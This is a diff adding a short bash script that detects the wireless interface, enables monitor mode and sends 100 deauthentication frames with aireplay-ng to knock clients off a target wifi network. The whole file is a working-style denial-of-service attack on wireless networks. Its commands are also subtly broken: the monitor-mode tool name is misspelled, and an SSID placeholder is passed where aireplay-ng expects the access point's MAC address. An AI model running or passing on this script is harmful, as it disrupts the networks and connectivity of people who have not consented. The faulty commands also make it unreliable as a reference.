@@ -1,0 +1,8 @@
+#!/usr/bin/env bash
+
+WDEV="$(iw dev | awk '/Interface/{print $2}')"
+SSID="x"
+
+sudo airomon-ng start "$WDEV"
+sudo aireplay-ng --deauth 100 -a "$SSID" ${WDEV}mon
+
